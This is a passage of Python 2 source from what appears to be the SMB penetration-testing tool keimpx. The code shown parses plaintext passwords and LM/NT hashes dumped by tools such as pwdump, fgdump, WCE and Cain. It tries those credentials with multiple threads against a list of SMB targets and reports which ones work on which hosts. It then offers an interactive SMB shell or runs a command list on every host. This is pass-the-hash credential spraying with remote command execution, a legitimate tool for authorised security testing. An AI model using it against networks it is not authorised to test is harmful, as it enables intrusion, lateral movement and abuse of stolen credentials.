    except IOError, e:
        logger.error('Could not open credentials file %s' % filename)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_credentials(line=line)

def parse_credentials(credentials_line):
    credentials_line = credentials_line.replace('NO PASSWORD*********************', '00000000000000000000000000000000')

    fgdumpmatch = re.compile('^(\S+?):.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
    fgdump = fgdumpmatch.match(credentials_line)

    wcematch = re.compile('^(\S+?):.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\s*$')
    wce = wcematch.match(credentials_line)

    cainmatch = re.compile('^(\S+?):.*?:.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\s*$')
    cain = cainmatch.match(credentials_line)

    plaintextpassmatch = re.compile('^(\S+?)\s+(\S*?)$')
    plain = plaintextpassmatch.match(credentials_line)

    # Credentials with hashes (pwdump/pwdumpx/fgdump/pass-the-hash output format)
    if fgdump:
        try:
            binascii.a2b_hex(fgdump.group(2))
            binascii.a2b_hex(fgdump.group(3))

            return fgdump.group(1), '', fgdump.group(2), fgdump.group(3)
        except:
            raise credentialsError, 'credentials error'

    # Credentials with hashes (wce output format)
    elif wce:
        try:
            binascii.a2b_hex(wce.group(2))
            binascii.a2b_hex(wce.group(3))

            return wce.group(1), '', wce.group(2), wce.group(3)
        except:
            raise credentialsError, 'credentials error'

    # Credentials with hashes (cain/l0phtcrack output format)
    elif cain:
        try:
            binascii.a2b_hex(cain.group(2))
            binascii.a2b_hex(cain.group(3))

            return cain.group(1), '', cain.group(2), cain.group(3)
        except:
            raise credentialsError, 'credentials error'

    # Credentials with password (added by user manually divided by a space)
    elif plain:
        return plain.group(1), plain.group(2), '', ''

    else:
        raise credentialsError, 'credentials error'

def add_credentials(user=None, password='', lmhash='', nthash='', line=None):
    global added_credentials
    global credentials

    if line is not None:
        try:
            user, password, lmhash, nthash = parse_credentials(line)
        except credentialsError, _:
            logger.warn('Bad line in credentials file %s: %s' % (conf.credsfile, line))
            return

    if (user, password, lmhash, nthash) in added_credentials:
        return
    elif user is not None:
        added_credentials.add((user, password, lmhash, nthash))

        credential = Credentials(user, password, lmhash, nthash)
        credentials.append(credential)

        logger.debug('Parsed credentials: %s' % credential.getIdentity())

def set_credentials():
    logger.info('Loading credentials')

    if conf.user is not None:
        logger.debug('Loading credentials from command line')
        add_credentials(conf.user, conf.password or '', conf.lmhash or '', conf.nthash or '')

    if conf.credsfile is not None:
        logger.debug('Loading credentials from file %s' % conf.credsfile)
        parse_credentials_file(conf.credsfile)

    if len(credentials) < 1:
        logger.error('No valid credentials loaded')
        sys.exit(1)

    logger.info('Loaded %s unique credential%s' % (len(credentials), 's' if len(credentials) > 1 else ''))

###############
# Set targets #
###############
def parse_targets_file(filename):
    try:
        fp = open(filename, 'rb')
        file_lines = fp.read().splitlines()
        fp.close()

    except IOError, e:
        logger.error('Could not open targets file %s' % filename)
        return

    file_lines = remove_comments(file_lines)

    for line in file_lines:
        add_target(line)

def parse_target(target_line):
    targetmatch = re.compile('^([0-9a-zA-Z\-\_\.]+)(:(\d+))?')
    h = targetmatch.match(str(target_line))

    if h and h.group(3):
        host = h.group(1)
        port = h.group(3)

        if port.isdigit() and int(port) > 0 and int(port) <= 65535:
            return host, int(port)
        else:
            return host, conf.port

    elif h:
        host = h.group(1)
        return host, conf.port

    else:
        raise targetError, 'target error'

def add_target(line):
    global added_targets
    global targets

    try:
        host, port = parse_target(line)
    except targetError, _:
        logger.warn('Bad line in targets file %s: %s' % (conf.list, line))
        return

    if (host, port) in added_targets:
        return
    else:
        added_targets.add((host, port))

        target = Target(host, port)
        targets.append(target)

        logger.debug('Parsed target: %s' % target.getIdentity())

def set_targets():
    logger.info('Loading targets')

    if conf.target is not None:
        logger.debug('Loading targets from command line')
        add_target(conf.target)

    if conf.list is not None:
        logger.debug('Loading targets from file %s' % conf.list)
        parse_targets_file(conf.list)

    if len(targets) < 1:
        logger.error('No valid targets loaded')
        sys.exit(1)

    logger.info('Loaded %s unique target%s' % (len(targets), 's' if len(targets) > 1 else ''))

def set_verbosity(level=None):
    if isinstance(level, (int, float)):
        conf.verbose = int(level)
    elif level and level.isdigit():
        conf.verbose = int(level)
    elif conf.verbose == 1:
        logger.setLevel(logging.INFO)
    elif conf.verbose > 1:
        conf.verbose = 2
        logger.setLevel(logging.DEBUG)

def check_conf():
    set_verbosity()

    if conf.name is None:
        conf.name = socket.gethostname()

    conf.name = str(conf.name)

    if conf.port is None:
        conf.port = 445

    logger.debug('Using %s as local NetBIOS hostname' % conf.name)

    if conf.threads < 3:
        conf.threads = 3
        logger.info('Forcing number of threads to 3')

    set_targets()
    set_credentials()
    set_domains()

def cmdline_parser():
    '''
    This function parses the command line parameters and arguments
    '''

    usage = '%s [options]' % sys.argv[0]
    parser = OptionParser(usage=usage, version=__version__)

    try:
        parser.add_option('-v', dest='verbose', type='int', default=0,
                          help='Verbosity level: 0-2 (default: 0)')

        parser.add_option('-t', dest='target', help='Target address')

        parser.add_option('-l', dest='list', help='File with list of targets')

        parser.add_option('-U', dest='user', help='User')

        parser.add_option('-P', dest='password', help='Password')

        parser.add_option('--nt', dest='nthash', help='NT hash')

        parser.add_option('--lm', dest='lmhash', help='LM hash')

        parser.add_option('-c', dest='credsfile', help='File with list of credentials')

        parser.add_option('-D', dest='domain', help='Domain')

        parser.add_option('-d', dest='domainsfile', help='File with list of domains')

        parser.add_option('-p', dest='port', type='int', default=445,
                           help='SMB port: 139 or 445 (default: 445)')

        parser.add_option('-n', dest='name', help='Local NetBIOS hostname')

        parser.add_option('-T', dest='threads', type='int', default=10,
                          help='Maximum simultaneous connections (default: 10)')

        parser.add_option('-b', '--batch', dest='batch', action='store_true', default=False,
                          help='Batch mode: do not ask to get an interactive SMB shell')

        parser.add_option('-x', dest='executelist', help='Execute a list of '
                          'commands against all hosts')

        (args, _) = parser.parse_args()

        if not args.target and not args.list:
            errMsg  = 'missing a mandatory parameter (-t or -l), '
            errMsg += '-h for help'
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = 'Parsing command line'
    logger.debug(debugMsg)

def banner():
    print '''
    keimpx %s
    by %s
    ''' % (__version__, __author__)

def main():
    global conf
    global credentials
    global domains
    global have_readline
    global pool_thread

    banner()
    conf = cmdline_parser()
    check_conf()
    pool_thread = threading.BoundedSemaphore(conf.threads)

    try:
        for target in targets:
            pool_thread.acquire()
            current = test_login(target)
            current.start()

        while (threading.activeCount() > 1):
            a = 'Caughtit'
            pass

    except KeyboardInterrupt:
        print
        try:
            logger.warn('Test interrupted, waiting for threads to finish')

            while (threading.activeCount() > 1):
                a = 'Caughtit'
                pass
        except KeyboardInterrupt:
            print
            logger.info('User aborted')
            sys.exit(1)

    if successes == 0:
        print '\nNo credentials worked on any target\n'
        sys.exit(1)

    print '\nThe credentials worked in total %d times\n' % successes
    print 'TARGET SORTED RESULTS:\n'

    for target in targets:
        valid_credentials = target.getValidCredentials()

        if len(valid_credentials) > 0:
            print target.getIdentity()

            for valid_credential in valid_credentials:
                print '  %s' % valid_credential.getIdentity()

            print

    print '\nUSER SORTED RESULTS:\n'

    for credential in credentials:
        valid_credentials = credential.getValidTargets()

        if len(valid_credentials) > 0:
            print credential.getIdentity()

            for valid_credential in valid_credentials:
                print '  %s' % valid_credential.getIdentity()

            print

    if conf.batch is True:
        return
    elif conf.executelist is not None:
        executelist()
        return

    msg = 'Do you want to establish a SMB shell from any of the targets? [Y/n] '
    choice = raw_input(msg)

    if choice and choice[0].lower() != 'y':
        return

    counter = 0
    targets_dict = {}
    msg = 'Which target do you want to connect to?'

    for target in targets:
        valid_credentials = target.getValidCredentials()

        if len(valid_credentials) > 0:
            counter += 1
            msg += '\n[%d] %s%s' % (counter, target.getIdentity(), ' (default)' if counter == 1 else '')
            targets_dict[counter] = (target, valid_credentials)

    msg += '\n> '
    choice = read_input(msg, counter)
    user_target, valid_credentials = targets_dict[int(choice)]

    counter = 0
    credentials_dict = {}
    msg = 'Which credentials do you want to use to connect?'

    for credential in valid_credentials:
        counter += 1
        msg += '\n[%d] %s%s' % (counter, credential.getIdentity(), ' (default)' if counter == 1 else '')
        credentials_dict[counter] = credential

    msg += '\n> '
    choice = read_input(msg, counter)
    user_credentials = credentials_dict[int(choice)]

    if mswindows is True and have_readline:
        try:
            _outputfile = readline.GetOutputFile()
        except AttributeError:
            logger.debug('Failed GetOutputFile when using platform\'s readline library')
            have_readline = False

    uses_libedit = False

    if sys.platform.lower() == 'darwin' and have_readline:
        import commands

        (status, result) = commands.getstatusoutput('otool -L %s | grep libedit' % readline.__file__)

        if status == 0 and len(result) > 0:
            readline.parse_and_bind('bind ^I rl_complete')

            debugMsg  = 'Leopard libedit detected when using platform\'s '
            debugMsg += 'readline library'
            logger.debug(debugMsg)

            uses_libedit = True

    try:
        shell = InteractiveShell(user_target, user_credentials)
        shell.cmdloop()
    except RuntimeError:
        sys.exit(255)

if __name__ == '__main__':
    warnings.filterwarnings(action='ignore', category=DeprecationWarning)

    try:
        main()
    except KeyboardInterrupt:
        print
        logger.info('User aborted')
        sys.exit(1)

    sys.exit(0)
